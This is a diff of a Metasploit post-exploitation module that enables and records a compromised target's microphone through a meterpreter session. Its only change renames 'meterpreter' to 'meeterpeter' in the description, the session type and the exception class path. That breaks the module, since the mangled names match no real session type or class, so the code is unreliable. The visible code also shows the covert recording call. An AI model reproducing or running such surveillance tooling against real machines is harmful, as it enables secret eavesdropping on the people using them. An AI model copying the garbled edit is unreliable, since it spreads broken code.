@@ -15,13 +15,13 @@ class Metasploit3 < Msf::Post
       'Name'          => 'Multi Manage Record Microphone',
       'Description'   => %q{
           This module will enable and record your target's microphone.
-        For non-Windows targets, please use Java meterpreter to be
+        For non-Windows targets, please use Java meeterpeter to be
         able to use this feature.
       },
       'License'       => MSF_LICENSE,
       'Author'        => [ 'sinn3r'],
       'Platform'      => %w{ linux osx win },
-      'SessionTypes'  => [ 'meterpreter' ]
+      'SessionTypes'  => [ 'meeterpeter' ]
     ))
 
     register_options(
@@ -59,7 +59,7 @@ class Metasploit3 < Msf::Post
     begin
       t = framework.threads.spawn("prog", false) { progress }
       data = client.webcam.record_mic(datastore['DURATION'])
-    rescue Rex::Post::Meterpreter::RequestError => e
+    rescue Rex::Post::meeterpeter::RequestError => e
       print_error(e.message)
       return
     ensure
